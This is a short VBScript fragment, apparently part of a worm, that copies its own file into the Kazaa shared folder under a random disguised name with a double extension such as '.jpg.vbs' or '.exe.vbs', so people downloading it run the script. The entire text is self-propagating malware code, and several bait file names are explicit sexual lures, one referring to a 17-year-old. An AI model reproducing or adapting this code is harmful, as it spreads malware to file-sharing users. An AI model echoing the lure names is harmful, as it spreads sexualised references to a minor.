   set fso = createobject("Scripting.Filesystemobject")
   fso.copyfile wscript.scriptfullname, "C:\Program Files\Kazaa\My Shared Folder\" & Newname

   function newname()
   randomize timer
   l = int(rnd * 5)+1
   if l = 1 then newname = "PC Booster.exe.vbs"
   if l = 2 then newname = "Internet OverClocker.exe.vbs"
   if l = 3 then newname = "SEX.jpg.vbs"
   if l = 4 then newname = "17 year old hot teen chick get fucked.jpg.vbs"
   if l = 5 then newname = "Teen getting fucked by teen.jpg.vbs"

   end function

